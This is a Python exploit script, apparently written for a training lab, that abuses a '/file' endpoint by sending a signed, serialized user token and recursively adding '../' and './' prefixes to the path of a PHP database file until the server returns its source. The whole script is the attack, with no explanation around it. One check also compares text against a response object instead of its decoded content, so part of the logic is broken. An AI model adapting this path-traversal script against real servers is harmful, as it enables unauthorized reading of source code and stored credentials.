import requests
import json
from pprint import pprint

url = "http://ptl-f69fa33a-e9bebd26.libcurl.so/file"
headers = {"Content-Type": "application/json"}


def search_content(prefix_path, n):
    if n == 0:
        return True
    resp_content = search_req(prefix_path).content.decode()
    if "<?php" in resp_content:
        print(prefix_path, resp_content)
        return True
    resp_content = search_req(prefix_path + "./")
    if "<?php" in resp_content:
        print(prefix_path, resp_content)
        return True
    n = n - 1
    search_content(prefix_path + "../", n)
    search_content(prefix_path + "./", n)


def search_req(prefix_path):
    data = {
        "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjEiO3M6NToibG9naW4iO3M6MzoieHl6Ijt9--7b03604a9f3aae595030f67cb4f8bf5a",
        "uuid": "var/www/classes/db.php",
        "sig": 0
    }

    data['uuid'] = prefix_path + data['uuid']
    print(data)
    resp = requests.post(url, data=json.dumps(data), headers=headers)
    return resp


search_content("../", 15)
